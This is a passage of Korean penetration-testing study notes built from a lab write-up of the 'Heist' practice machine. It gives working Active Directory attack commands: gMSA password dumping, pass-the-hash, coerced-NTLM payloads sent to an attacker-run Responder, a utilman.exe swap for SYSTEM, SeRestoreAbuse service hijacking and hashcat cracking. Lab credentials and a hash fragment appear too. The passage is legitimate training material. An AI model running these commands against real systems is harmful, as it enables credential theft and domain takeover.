> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ jq -r '.data[] | (.Aces//[])[] | select(.RightName|test("GetChanges"))
>            | [.RightName,.PrincipalSID,.PrincipalType] | @tsv' 20260708141821_domains.json
> GetChanges	S-1-5-21-...-498	Group      # Enterprise Read-only Domain Controllers
> GetChangesAll	S-1-5-21-...-516	Group      # Domain Controllers
> GetChangesInFilteredSet	HEIST.OFFSEC-S-1-5-32-544	Group      # Administrators
> GetChanges	HEIST.OFFSEC-S-1-5-32-544	Group
> GetChangesAll	HEIST.OFFSEC-S-1-5-32-544	Group
> GetChangesInFilteredSet	HEIST.OFFSEC-S-1-5-9	Group      # Enterprise Domain Controllers
> GetChanges	HEIST.OFFSEC-S-1-5-9	Group
> ```
> **전부 기본 principal뿐이다.** `svc_apache$`(`-1105`)도, `WEB ADMINS`(`-1104`)도 없다. `impacket-secretsdump`를 던져봤자 `DRSUAPI` 권한 거부로 끝난다 — **던지기 전에 JSON 한 줄로 알 수 있었다.**
> 도메인 객체의 ACE를 먼저 보는 습관
> `domains.json`(또는 BloodHound GUI에서 도메인 노드 → Inbound Object Control)에 **`GetChanges` + `GetChangesAll`을 동시에** 가진 비기본 principal이 있으면 그것이 DCSync 경로다. 둘 중 하나만으로는 안 된다.
> 이 확인은 10초고, secretsdump를 돌려 실패를 보는 것은 **1~2분 + 오판의 여지**다.
> **남은 후보 3이 `SeRestorePrivilege`였고, 그것이 정답이었다.**

⚠️ **원문 jq 블록의 SID 는 `S-1-5-21-...-498` 처럼 «손으로 축약»돼 있었고 `# Enterprise Read-only Domain Controllers` 류 주석도 손으로 붙인 것이다.** 실제 출력에는 축약도 주석도 없다(2026-08-26 재실행 확인). 위 제안본은 **실제 출력**을 실었고 RID 해설은 산문으로 내렸다.

---

## 8. B-5. Active Directory — **신규**

**제목 제안:** `gMSA — 크랙할 수 없지만 «읽을» 수는 있는 계정`
(번호는 반영자가 배정)

### 넣을 본문

**판별 신호 두 개.** ⓐ 계정명이 `$` 로 끝나는데 `C:\Users` 에 프로필이 있다 ⓑ DN 이 `CN=…,CN=Managed Service Accounts,DC=…` 다. 둘 중 하나면 gMSA 를 의심한다.
```bash
jq -r '.data[] | select(.Properties.name=="<계정>$@<DOMAIN>") | .Properties.distinguishedname' <ts>_users.json
```

**왜 크랙이 아니라 ACL 문제인가.** 비밀번호를 관리자가 정하지 않는다 — DC 가 KDS root key 에서 계정별로 파생해 만들고 기본 30일마다 자동 롤한다. 길이는 **240바이트(유니코드 120자)** 라 사전 크랙이 원천 불가다. 대신 `msDS-ManagedPassword` 라는 **계산된(constructed) 속성**으로 LDAP 에서 조회된다 — 디스크에 그 이름으로 저장된 것이 아니라 요청 시점에 DC 가 만들어 준다. 누가 읽을 수 있는지는 `msDS-GroupMSAMembership`(= `PrincipalsAllowedToRetrieveManagedPassword`) 보안 서술자가 정하고, **BloodHound 의 `ReadGMSAPassword` 엣지가 정확히 이 속성을 읽어 만든 것**이다.
→ 같은 이유로 **gMSA·컴퓨터 계정은 Kerberoasting 대상이 아니다.** SPN 이 붙어 있어도 크랙이 안 된다. Kerberoasting 은 「SPN 이 붙은 **사람이 정한 비밀번호** 계정」을 노리는 공격이다 — 열거 결과가 `$` 로 끝나는 계정뿐이면 그 자리에서 접을 것.

**읽는 도구 넷 — 하나 막히면 다음 것.** 넷 다 같은 LDAP 속성 하나를 읽는다. 하나가 안 되면 구현 차이(LDAPS 강제·서명 요구·파이썬 버전)일 뿐이므로 **원리를 의심하지 말고 도구를 바꿀 것.**
1. `bloodyAD --host <DC> -d <FQDN> -u U -p P get object '<계정>$' --attr msDS-ManagedPassword` ← [[Heist]] 성공. **`$` 는 반드시 작은따옴표 안에** (bash 변수 확장)
2. `nxc ldap <IP> -u U -p P --gmsa`
3. `gMSADumper.py -u U -p P -d <FQDN>`
4. 타겟에서 `GMSAPasswordReader.exe --accountname <계정>` ← [[Heist]] 성공. AES Kerberos 키까지 필요할 때

| | bloodyAD (Kali) | GMSAPasswordReader (타겟) |
|---|---|---|
| 파일 업로드 | 불필요 | 필요 — AV·EDR 위험 |
| 얻는 것 | NT 해시 + base64 blob | NT 해시 + AES128/256 Kerberos 키 |
| 언제 | 기본 | AES 만 허용된 도메인(RC4 비활성)에서 Kerberos 를 써야 할 때 |

**시험에서는 bloodyAD 쪽이 낫다** — 업로드가 없어 흔적과 위험이 적다.

**출력을 읽는 법 두 가지.**
- `Old Value` / `Current Value` 가 함께 나온다. gMSA blob 에 이전·현재 비밀번호가 같이 들어 있기 때문이고(롤 직후 미갱신 클라이언트를 위한 유예), **써야 하는 것은 `Current Value`** 다
- `rc4_hmac` 은 **NT 해시와 같은 값**이다(Kerberos etype 23 이 NT 해시를 키로 씀). 그래서 그 한 값이 PtH 에도 `-k` Kerberos 인증에도 쓰인다. `bloodyAD` 의 `.NTLM:` 앞부분 `aad3b435b51404eeaad3b435b51404ee` 는 **빈 LM 해시**다

**획득 후 — PtH.** NTLM 인증의 입력은 비밀번호가 아니라 NT 해시라 평문 없이 인증이 성립한다. `evil-winrm -u '<계정>$' -H '<NT해시>'`. `-H` 에는 NT 부분만 준다(`LM:NT` 전체 형식도 대부분의 도구가 받지만 evil-winrm 은 NT 만이 안전).
⚠️ **Kerberos 에는 PtH 가 통하지 않는다** — NT 해시를 RC4 키로 쓰는 Overpass-the-Hash(`impacket-getTGT -hashes :<NT>`)로 가야 한다.

### 지우기 전 원문 (Heist §2-5 · §4-2 · §4-3 · §6-2 후반 · §6-5)

> gMSA(Group Managed Service Account)의 동작
> - 비밀번호를 관리자가 정하지 않는다. DC가 KDS root key에서 계정별로 파생해 만들고, 기본 30일마다 자동 롤한다. 길이는 **240바이트(유니코드 120자)** 라 사전 크랙이 불가능하다
> - 비밀번호는 `msDS-ManagedPassword`라는 계산된(constructed) 속성으로 LDAP에서 조회된다. 디스크에 그 이름으로 저장돼 있는 것이 아니라 요청 시점에 DC가 만들어 준다
> - 누가 읽을 수 있는지는 `msDS-GroupMSAMembership`(= `PrincipalsAllowedToRetrieveManagedPassword`) 보안 서술자가 정한다
> - **BloodHound의 `ReadGMSAPassword` 엣지가 정확히 이 속성을 읽어 만든 것이다**
> 즉 **gMSA는 "크랙할 수 없지만 읽을 수는 있는" 계정**이다. 크랙을 포기하고 ACL을 봐야 한다는 신호다.

> **SPN이 붙은 사용자 계정은 `krbtgt` 하나뿐이고, `krbtgt`는 Kerberoasting 대상이 아니다.** `svc_apache$`는 이름이 서비스 계정처럼 생겼지만 `hasspn: false`이고, 설령 SPN이 있어도 **gMSA는 120자 랜덤이라 크랙 불가**다(§2-5).
> **교훈: Kerberoasting은 "SPN이 붙은 *사람이 정한 비밀번호* 계정"을 노리는 공격이다.** `$`로 끝나는 계정만 나오면 그 자리에서 접어라.

> ### 6-5. `nxc ldap --gmsa` 시도
> ```bash
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ nxc ldap 192.168.120.165 -u enox -p california -d heist.offsec
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ nxc ldap 192.168.120.165 -u enox -p california -d heist.offsec --gmsa
> ```
> `--gmsa`는 nxc의 정식 옵션이고 이 경로 자체는 옳다. 이 두 줄의 출력은 기록에 남지 않았다 — 성공/실패를 단정할 수 없다. 이어서 `bloodyAD`를 쳤고 그쪽이 결과를 냈다는 사실만 확정적이다.
> gMSA 비밀번호를 읽는 도구는 최소 넷이다 — 하나 막히면 다음 것
> 1. `bloodyAD ... get object '<계정>$' --attr msDS-ManagedPassword` ← **이 박스에서 성공**
> 2. `nxc ldap <IP> -u U -p P --gmsa`
> 3. `gMSADumper.py -u U -p P -d <FQDN>`
> 4. 타겟에서 `GMSAPasswordReader.exe --accountname <계정>` ← **이 박스에서 성공** (AES 키까지 필요할 때)
> 넷 다 같은 LDAP 속성 하나를 읽는다. 하나가 안 되면 구현 차이(LDAPS 강제·서명 요구·파이썬 버전)일 뿐이므로 **원리를 의심하지 말고 도구를 바꿔라.**

> ### 6-2. Kerberoasting 시도 — 두 번 실패 (jq hasspn 블록)
> ```bash
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ jq -r '.data[].Properties | select(.hasspn==true) | .name' 20260708141821_users.json
> KRBTGT@HEIST.OFFSEC
> ```

⚠️ **`nxc ldap --gmsa` 두 줄의 「출력이 기록에 없어 성공/실패를 단정할 수 없다」는 유보를 반드시 살릴 것.**
⚠️ 노트에는 gMSA 의 **이 박스 실측**(DN 조회·ACE·bloodyAD·GMSAPasswordReader 출력·PtH)만 남겼다. 위 일반화·도구 폴백 목록·Kerberoasting 판정은 전량 이관이다.

---

## 9. B-5. Active Directory — **신규**

**제목 제안:** `강제 인증(coerced authentication) — 「URL 을 넣으세요」는 AD 에서 자격증명 유출구다`
(번호는 반영자가 배정)

### 넣을 본문

**신호.** 웹앱·이미지 프록시·PDF 렌더러·웹훅 테스트 폼 — **서버가 임의 URL 을 가져오는 자리**가 도메인 호스트에 있으면 SSRF 로 읽지 말고 **자격증명 유출구**로 읽는다.

**메커니즘.** Windows 클라이언트는 HTTP `401 Unauthorized` + `WWW-Authenticate: NTLM`(또는 SMB 세션 셋업의 NTLMSSP 협상)을 만나면 사용자에게 묻지 않고 **현재 로그온 세션의 자격증명으로** NTLM 챌린지·리스폰스를 수행한다. SSO 의 설계 의도이고, 공격자가 서버 역할을 맡으면 그대로 유출구가 된다.

**절차.**
1. `sudo responder -I tun0` — ⚠️ **`-I` 는 «인터페이스 이름»이지 IP 가 아니다.** [[Heist]] 는 `sudo responder -I 192.168.45.175` 를 먼저 치고 `-I tun0` 으로 고쳐 다시 쳤다(`~/.zsh_history` 에 두 줄이 연달아 남아 있음). 구체적 오류 문구는 **기록에 없음 — 관측된 것이 아님.** 확정적인 것은 `tun0` 으로 고친 직후 배너가 떴다는 사실뿐. VPN 인터페이스는 거의 항상 `tun0` 이고 `ip -br a` 로 확인하는 습관을 들일 것
2. 배너에서 **세 줄**을 읽는다 — `HTTP server [ON]`(트리거가 HTTP 면 필수) · `Responder IP [x.x.x.x]`(`?url=` 에 넣을 주소, VPN 재연결로 바뀜) · `Challenge set [random]`(레인보우 테이블 무의미, 사전 크랙만 남음). Kali 기본 `Responder.conf` 는 `SMB/HTTP/HTTPS/LDAP = On`, `Challenge = Random` 으로 출하된다
3. **리스너를 «먼저» 띄우고 페이로드를 넣는다.** 서버측 페치는 한 번만 일어난다 — Responder 가 안 떠 있으면 그 요청은 연결 거부로 끝나고, 앱이 결과를 캐시하면 같은 URL 을 다시 넣어도 요청이 안 나갈 수 있다. **방어책: 값을 매번 다르게 만든다** — `?url=http://<KALI>/1`, `/2`, `/3`. 캐시 키가 달라지므로 재시도가 확실히 나간다

**페이로드 변형 — 우선순위 순.** ⚠️ [[Heist]] 에서 **실제로 넣어본 것은 1번뿐**이고 나머지는 실행하지 않았으며 출력을 관측하지 않았다.
1. `http://<KALI>` — 가장 잘 통한다. HTTP 클라이언트를 쓰는 모든 페처가 대상
2. `\\<KALI>\share\x` — UNC. Windows 파일 API 를 태우면 SMB 인증이 나간다([[Vault]] 가 이 형태)
3. `file://<KALI>/share/x` — UNC 의 URL 표기. .NET·일부 라이브러리가 이쪽만 받는다
4. `http://127.0.0.1:<포트>/` — 방향을 바꿔 내부 포트 스캔. 응답 시간·오류 문구 차이로 개폐를 읽는다(B-72 와 같은 사고)
5. `http://<KALI>:80/@<타겟>` · `http://<KALI>#@<타겟>` — 허용목록 우회 변형. 필터가 있을 때만

**1번이 통하면 나머지를 시도할 이유가 없다** — 자격증명은 한 번만 잡으면 된다.

**페이로드를 조각내면 각 조각의 역할이 분명해진다.**

| 조각 | 역할 | 바꾸면 / 빼면 |
|---|---|---|
| `http://` | 스킴. 서버측 HTTP 클라이언트를 태운다 | 빼면 URL 파서가 상대 경로로 해석하거나 예외를 던진다. ⚠️ [[Heist]] 앱이 스킴 없는 값에 어떻게 반응하는지는 **관측 없음** |
| `<KALI-IP>` | Responder 가 바인딩된 주소 | VPN 재연결로 바뀌면 요청이 아무 데도 안 온다. 매번 `ip -br a` |
| (포트 없음) | 기본 80. Responder HTTP 서버가 80 에서 듣는다 | `:8000` 같은 비표준 포트를 쓰면 Responder 는 안 듣는다 |

**경로는 무의미하다** — `?url=http://<KALI>/anything` 이어도 같다. 인증은 첫 요청의 401 응답에서 발생하므로 **목적은 「응답 본문을 받아내는 것」이 아니라 「401 을 한 번 받게 하는 것」**이다. 이 구분이 SSRF 사고와 강제 인증 사고를 가른다.

**진입 벡터는 blob 이 스스로 말해준다 — AV_PAIR 의 `MsvAvTargetName`.** 캡처한 NetNTLMv2 blob 안에 클라이언트가 어느 서비스에 인증하려 했는지가 들어 있다. [[Heist]] = `HTTP/192.168.45.175`(웹 페치가 트리거), [[Vault]] = `cifs/192.168.45.175`(SMB 공유가 트리거). **한 필드로 벡터가 갈린다.**
```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ python3 - <<'EOF'
import binascii,struct
p=open('hash.txt').read().strip().split(':')
print('user=',p[0],'domain=',p[2],'challenge=',p[3])
print('NTProofStr=',p[4])
b=binascii.unhexlify(p[5]); i=28
while i+4<=len(b):
    aid,alen=struct.unpack('<HH',b[i:i+4]); i+=4
    v=b[i:i+alen]; i+=alen
    if aid==0: break
    if aid==9: print('MsvAvTargetName =',v.decode('utf-16le'))
EOF
user= enox domain= HEIST challenge= a9a24c7373e7eaf6
NTProofStr= 812295EA02430380A3C69B6C8CD67A27
MsvAvTargetName = HTTP/192.168.45.175
```
→ **Responder 없이 하려면** `impacket-smbserver share . -smb2support` 를 띄우고 UNC 를 넣는다. NetNTLMv2 가 그대로 콘솔에 찍힌다.

### 지우기 전 원문 (Heist §0 · §2-1 · §2-9 · §3-1 · §3-2 · §7-5)

> - **웹앱의 "URL을 넣으세요"는 AD에서 자격증명 유출구다** — SSRF가 데이터 유출이 아니라 **강제 인증(coerced authentication)** 으로 이어진다. Windows 프로세스가 HTTP 401 + `WWW-Authenticate: NTLM`을 만나면 자기 로그온 세션의 자격증명으로 자동 응답한다
> 변형은 이런 모습이다 — `?url=` 대신 이미지 프록시/PDF 렌더러/웹훅 테스트 폼, gMSA 대신 LAPS(`ms-Mcs-AdmPwd`), `SeRestore` 대신 `SeBackup`·`SeTakeOwnership`. **원리는 동일하다.**

> ### 2-1. 배경 — Windows "강제 인증"이란 무엇인가
> Windows에서 클라이언트가 서버에 접속했을 때 서버가 이렇게 답하면:
> - HTTP: `401 Unauthorized` + `WWW-Authenticate: NTLM`
> - SMB: 세션 셋업 단계에서 NTLMSSP 협상
> Windows 클라이언트는 사용자에게 아무것도 묻지 않고, 현재 로그온 세션의 자격증명으로 NTLM 챌린지·리스폰스를 수행한다. 이것이 SSO의 설계 의도다. 도메인 환경에서는 편의 기능이고, **공격자가 서버 역할을 맡으면 자격증명 유출구**가 된다.

> ### 2-9. 왜 이 페이로드인가 — `?url=` 값을 조각내어 본다 (표·변형 목록 원문 — 위 제안본에 그대로 옮김)
> 같은 자리에서 시도해 볼 변형 — 우선순위 순
> 어떤 앱이 어떤 스킴을 처리하는지 모르므로 위에서부터 하나씩 넣는다. 아래 중 이 박스에서 **실제로 넣어본 것은 1번뿐**이다 — 나머지는 실행하지 않았고 출력을 관측하지 않았다. (1~5번 목록)
> **1번이 통하면 나머지를 시도할 이유가 없다.** 자격증명은 한 번만 잡으면 된다.
> 리스너를 먼저 띄우고 페이로드를 넣어라 — 순서가 반대면 증거가 사라진다
> 서버측 페치는 한 번만 일어난다. Responder가 안 떠 있으면 그 요청은 연결 거부로 끝나고, 앱이 결과를 캐시하면 **같은 URL을 다시 넣어도 요청이 안 나갈 수 있다.**
> 방어책: 값을 매번 다르게 만든다 — `?url=http://192.168.45.175/1`, `/2`, `/3`. 캐시 키가 달라지므로 재시도가 확실히 나간다.

> `-I`는 **인터페이스 이름**이지 IP가 아니다
> 이 박스에서 `sudo responder -I 192.168.45.175`를 먼저 쳤다가 `-I tun0`으로 고쳐 다시 쳤다(`~/.zsh_history`에 두 줄이 연달아 남아 있다). VPN 인터페이스는 거의 항상 `tun0` 이다. `ip -br a`로 확인하는 습관을 들여라.

> ### 6-6. `responder -I`에 IP를 넣었다
> ```bash
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ sudo responder -I 192.168.45.175
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ sudo responder -I tun0
> ```
> 히스토리에 두 줄이 연달아 있다. `-I`는 인터페이스 이름을 받는다. 구체적 오류 문구는 기록에 없다 — 관측된 것이 아니다. 확정적인 것은 `tun0`으로 고쳐 친 직후 §3-1의 배너가 떴다는 사실뿐이다.

> - Responder 없이 강제 인증 수신 → `impacket-smbserver share . -smb2support` 를 띄우고 UNC를 넣는다. NetNTLMv2가 그대로 콘솔에 찍힌다

⚠️ **노트에는 이 박스의 실측만 남겼다** — Responder 배너 원문, `Responder.conf` grep, `?url=` 투입 URL, 캡처 blob, AV_PAIR 디코드 블록. 변형 우선순위·「리스너 먼저」·`-I` 함정·Responder 없이 하는 법은 전량 이관이다.

---

## 10. B-4. 윈도우 권한상승 — **신규**

**제목 제안:** `SeRestorePrivilege — SYSTEM 으로 가는 두 갈래(파일 / 레지스트리)와 그 전제조건`
(번호는 반영자가 배정. B-46 다음 자리)

### 넣을 본문

**무엇인가.** 설계 의도는 「백업 소프트웨어가 복원할 때 파일 DACL 을 무시하고 덮어쓸 수 있게」 하는 것. 그 결과 보유자는 **`%SystemRoot%\System32` 같은 ACL 보호 위치에도 쓰기·삭제·이름변경이 가능**해지고, `HKLM` 보호 키에 대해서도 같은 성질을 갖는다.

| 경로 | 건드리는 객체 | SYSTEM 이 되는 이유 |
|---|---|---|
| **A. `utilman.exe` 치환** | 파일 `C:\Windows\System32\utilman.exe` | RDP 로그인 화면의 접근성 버튼은 **로그온 전**이라 `NT AUTHORITY\SYSTEM` 으로 실행된다. 그 실행 파일을 `cmd.exe` 로 바꿔치기하면 로그인 화면에서 SYSTEM 콘솔이 열린다 |
| **B. `SeRestoreAbuse.exe`** | 레지스트리(서비스 설정 키) | 서비스의 실행 경로를 내 페이로드로 바꾸고 그 서비스를 시작시킨다. 서비스는 LocalSystem 으로 뜬다 |

**⛔ 경로 A 의 숨은 전제조건 — NLA 가 꺼져 있어야 한다.**
`utilman` 트릭은 로그인 «화면»에 도달해야 성립한다. NLA(Network Level Authentication)가 켜져 있으면 화면이 그려지기 전에 자격증명을 요구하므로 Win+U 를 누를 화면 자체가 없다. **nmap·nxc 가 이미 답을 준다:**
```text
RDP  192.168.120.165  3389  DC01  [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:heist.offsec) (nla:False)
```
**`nla:True` 면 경로 A 는 버리고 경로 B 로 간다.** 이 한 글자를 확인하지 않고 utilman 을 갈아엎으면 시스템 파일만 망가뜨리고 끝난다.

**경로 A 실행 — 순서가 중요하다.** 원본을 먼저 치워야 이름 충돌 없이 `cmd.exe` 를 그 자리에 놓을 수 있다.
```powershell
ren utilman.exe utilman.old
ren cmd.exe Utilman.exe
```
오류 없이 두 줄이 통과했다는 것 자체가 **`SeRestorePrivilege` 가 DACL 을 우회했다는 증거**다 — 일반 사용자는 `System32` 에 이름변경을 못 한다.
`xfreerdp3 /v:<IP> /cert:ignore /sec:tls` 로 **자격증명 없이** 붙는다. `/sec:tls` 를 빼면 NLA 협상으로 빠져 자격증명을 먼저 요구해 로그인 화면에 도달하지 못한다.
⚠️ **끝나면 되돌릴 것** — `ren Utilman.exe cmd.exe` → `ren utilman.old utilman.exe`. 시험은 리버트 후 재현을 요구하므로 원복 절차까지가 한 세트다.
⚠️ **이름을 바꾼 `cmd.exe` 는 배너 자리에 오류 문구를 뱉는다** — `The system cannot find message text for message number 0x2350 in the message file for Application.` · `Not enough memory resources are available to process this command.` 자기 메시지 리소스를 자기 파일명으로 못 찾아 생기는 표시로 보임 `[가정]`. **셸 자체는 정상 동작한다** — 같은 화면의 `whoami` 가 `nt authority\system` 이었다([[Heist]], 출처 `파일보관\Pasted image 20260708153113.png`). **오류로 보고 경로를 접지 말 것.**

**경로 B 실행.** `SeRestoreAbuse.exe "<명령>"` → `RegCreateKeyExA result: 0` / `RegSetValueExA result: 0` (Win32 에서 **0 = `ERROR_SUCCESS`**). 함께 찍히는 `Start-Service seclogon` 은 다음에 칠 명령을 알려주는 안내 문자열 — 이 도구는 `seclogon`(Secondary Logon) 서비스 실행 경로를 바꿔놓고 그 서비스를 시작하라고 요구한다.
⚠️ Kali 에는 컴파일된 `.exe` 만 있고 소스가 없어(`~/git/SeRestoreAbuse/SeRestoreAbuse.exe`) **어느 레지스트리 키를 정확히 쓰는지는 확인하지 못했음** `[가정]`.

**두 경로 우열 — 시험이라면 A 를 먼저.**

| | A: utilman + RDP | B: SeRestoreAbuse + nc |
|---|---|---|
| 전제조건 | `nla:False` · 3389 열림 | 없음 (WinRM 만 있으면 됨) |
| 업로드 | 없음 | 2개 — AV 위험 |
| 남기는 흔적 | 시스템 파일 2개 이름변경 — 원복 필수 | 서비스 설정 변경 — 원복 권장 |
| 셸 품질 | GUI 콘솔(붙여넣기 불편) | `rlwrap` 리버스셸 — 스크립트하기 좋음 |
| 안정성 | 화면 조작이라 실패해도 즉시 앎 | 서비스 시작 타이밍에 의존 |

**변형 — 같은 부류로 읽을 것.** `SeRestore` 대신 `SeBackup`(`ntds.dit` + `SYSTEM` 하이브 → `secretsdump`, [[Vault]])·`SeTakeOwnership`(소유권 탈취 → DACL 재작성). **특권 이름 하나가 곧 경로다.**

**`whoami /priv` 특권 → 경로 대응표**

| 특권 | 경로 | 참고 |
|---|---|---|
| `SeImpersonatePrivilege` | PrintSpoofer / GodPotato / SweetPotato | [[Squid]] · B-46 |
| `SeRestorePrivilege` | `utilman.exe` 치환 · 서비스 레지스트리 하이재킹 | [[Heist]] · [[Vault]] |
| `SeBackupPrivilege` | `ntds.dit` + `SYSTEM` 하이브 → `secretsdump` | [[Vault]] |
| `SeTakeOwnershipPrivilege` | 대상 파일 소유권 탈취 → DACL 재작성 | |
| `SeDebugPrivilege` | lsass 덤프 → mimikatz | |
| `SeLoadDriverPrivilege` | 취약 드라이버 로드 | |
| 아무것도 없음 | 서비스 오설정·AlwaysInstallElevated·자동로그온 레지스트리로 방향 전환 | B-41 · B-42 |

### 지우기 전 원문 (Heist §0 · §2-7 · §4-4 · §4-5 · §4-6 · §7-4)

> - **`SeRestorePrivilege`는 SYSTEM으로 가는 두 갈래 길** — 파일 계열(`utilman.exe` 치환 → RDP 로그인 화면) / 레지스트리 계열(서비스 ImagePath 하이재킹)

> ### 2-7. `SeRestorePrivilege` — 왜 이것이 SYSTEM인가
> 이 특권의 설계 의도는 "백업 소프트웨어가 복원할 때 파일 DACL을 무시하고 덮어쓸 수 있게" 하는 것이다. 그 결과 보유자는 **`%SystemRoot%\System32` 같은 ACL로 보호된 위치에도 쓰기·삭제·이름변경이 가능**해진다. 레지스트리 쪽 대응물은 `SeBackupPrivilege`/`SeRestorePrivilege`가 `HKLM` 보호 키에 대해 갖는 같은 성질이다. (두 갈래 표 원문 — 위 제안본에 그대로 옮김)
> > [!danger] 경로 A의 숨은 전제조건 — **NLA가 꺼져 있어야 한다**
> > `utilman` 트릭은 로그인 화면에 도달해야 성립한다. NLA(Network Level Authentication)가 켜져 있으면 **화면이 그려지기 전에 자격증명을 요구**하므로 Win+U를 누를 화면 자체가 없다.
> > 이 박스는 nmap이 이미 답을 줬다: (nla:False RDP 줄)
> > **`nla:False`.** 그래서 자격증명 없이 `xfreerdp3`로 붙어도 로그인 화면이 그려진다.
> > **`nla:True`면 경로 A는 버리고 경로 B로 간다.** 이 한 글자를 확인하지 않고 utilman을 갈아엎으면 시스템 파일만 망가뜨리고 끝난다.

> ### 4-6. 두 경로 우열 (표 원문 — 위 제안본에 그대로 옮김)
> **시험이라면 A를 먼저 시도한다** — 업로드가 없어 AV를 건드리지 않고, 실패 판정이 즉각적이다. `nla:True`거나 3389가 막혀 있으면 B로 간다.

> 4. **`whoami /priv`의 특권 이름 → 경로 대응표** (외워라) — 표 원문(위 제안본에 그대로 옮김)

⚠️ **노트에는 이 박스의 실측만 남겼다** — `ren` 두 줄, `xfreerdp3` 명령과 플래그 표, SYSTEM 콘솔 전사, `SeRestoreAbuse` 출력, 리버스셸, 두 경로 우열 표(경로가 둘 이상이면 우열을 노트에 적으라는 STANDARD 요구). 변형·특권 대응표·NLA 판정 일반화는 전량 이관이다.
⚠️ **`nla:False` 근거 줄은 노트의 `nxc-sweep` 출력 안에 그대로 살아 있다** — 콜아웃의 인용 블록만 제거했고 실측은 손실 없음.

---

## 11. B-66. 해시 접두어로 포맷을 즉시 판별한다 — **병합**

### 넣을 본문

**AD 에서 얻는 해시 4종 → hashcat 모드.** `hashcat -hh` 실행 결과 원문:
```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -hh | grep -E "^\s+(5500|5600|13100|18200|19700|1000)\s"
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
   1000 | NTLM                                                       | Operating System
```

| 얻은 것 | 모드 | 언제 나오는가 |
|---|---|---|
| Responder / 강제 인증 결과 | `-m 5600` | [[Heist]]·[[Vault]] |
| AS-REP (`GetNPUsers`) | `-m 18200` | 계정에 `DONT_REQ_PREAUTH` 가 켜져 있을 때 |
| TGS-REP (`GetUserSPNs`, Kerberoasting) | `-m 13100`(RC4) / `-m 19700`(AES256) | 계정에 SPN 이 붙어 있을 때 |
| NT 해시 (secretsdump 등) | `-m 1000` | 이미 크랙할 필요 없이 PtH 로 씀 |

**왜 AS-REP·TGS-REP 이 크랙 가능한 물건을 뱉는가.**
- **AS-REP(`-m 18200`)** — 정상 Kerberos 는 AS-REQ 에 **사전인증(pre-authentication)** 을 요구한다. 클라이언트가 현재 시각을 자기 비밀번호 파생 키로 암호화해 보내야 KDC 가 AS-REP 을 준다. 비밀번호를 모르면 그 암호문을 못 만들어 KDC 는 아무것도 안 준다. 그런데 계정에 `DONT_REQ_PREAUTH` 가 켜져 있으면 KDC 가 **아무 검증 없이 AS-REP 을 발급**하고, 그 일부가 사용자 키로 암호화돼 있어 오프라인 크랙 대상이 된다. **비밀번호를 몰라도 인증 없이 받아낼 수 있다는 것이 핵심**이다
- **TGS-REP(`-m 13100`)** — 도메인 사용자면 누구나 임의 SPN 의 TGS 를 요청할 수 있고, 그 티켓 부분이 SPN 이 걸린 서비스 계정의 키로 암호화된다. 서비스 계정 비밀번호가 사람이 정한 문자열이면 크랙된다. **컴퓨터 계정(`…$`)과 gMSA 는 120자 랜덤이라 크랙 불가**

**⛔ NetNTLMv2 해시는 한 글자도 편집하지 말 것.** 사용자명·도메인·blob 이 전부 HMAC 입력이다. 줄바꿈이 끼거나 도메인을 NetBIOS 대신 FQDN 으로 바꿔 적으면 **정답 비밀번호를 넣어도 크랙이 실패한다.** Responder 출력의 `[HTTP] NTLMv2 Hash :` 뒤 한 줄 전체를 그대로 파일에 넣을 것.
필드 구조: `사용자명 : (LM 빈칸) : 도메인(NetBIOS) : 서버챌린지 : NTProofStr : blob`. 크랙 알고리즘은 `NTHash = MD4(UTF16LE(p))` → `NTLMv2Hash = HMAC-MD5(NTHash, UTF16LE(USER.upper()+DOMAIN))` → `HMAC-MD5(NTLMv2Hash, 챌린지‖blob)` 가 `NTProofStr` 과 같으면 정답.

**손절선 — 12초.** NetNTLMv2 는 반복(iteration)이 없는 HMAC-MD5 2회라 CPU 만으로도 초당 100만 건이 나온다([[Heist]] 실측 `1244.3 kH/s`, Ryzen 7 9800X3D). **rockyou 전체가 CPU 에서 12초다.** 12초 안에 안 나오면 규칙(`-r /usr/share/hashcat/rules/best64.rule`)을 붙이거나 크랙을 포기하고 다른 경로로 갈 것. **여기서 30분을 쓰는 것이 시험에서 가장 흔한 시간 낭비다.** ([[Heist]] 는 `Progress: 4096/14344385`, 2초에 끝났다)

### 지우기 전 원문 (Heist §0 · §2-3 · §3-3)

> - **NetNTLMv2는 "릴레이"와 "크랙"이 갈린다** — SMB 서명이 필수면 릴레이는 죽고 크랙만 남는다. 어느 쪽인지 판정하는 근거가 nmap 한 줄에 있다
> - **NTLM 크랙 결과를 4개 프로토콜에 한 번에 던지는 습관** — SMB·WinRM·RDP·MSSQL. 시험 AD 세트에서 이 스윕이 피벗의 출발점이다

> ### 2-3. NetNTLMv2 해시를 필드 단위로 해부한다 (필드 표 · 크랙 알고리즘 · 편집 금지 경고 · hashcat 모드 블록과 대응표 · AS-REP/Kerberoast 설명 원문 — 위 제안본에 그대로 옮김)

> **`Progress: 4096/14344385` — 1,434만 후보 중 4,096번째에서 끝났다. 2초.** rockyou 앞쪽에 있는 비밀번호였다.
> 2초 안에 안 깨지면 **rockyou로는 안 깨진다**
> NetNTLMv2는 반복(iteration)이 없는 HMAC-MD5 2회라 CPU만으로도 초당 100만 건이 나온다(위 출력의 `1244.3 kH/s`). rockyou 전체가 CPU에서 12초다.
> 12초 안에 안 나오면 규칙(`-r /usr/share/hashcat/rules/best64.rule`)을 붙이거나, 크랙을 포기하고 다른 경로로 간다. 여기서 30분을 쓰는 것이 시험에서 가장 흔한 시간 낭비다.

⚠️ **노트에는 필드 해부 표·크랙 알고리즘·편집 금지 경고·`Progress: 4096/…` 실측만 남겼다**(이 박스 해시를 읽는 데 필요하므로). hashcat 모드 블록·대응표·AS-REP/Kerberoast 설명·12초 손절선은 전량 이관이다.

---

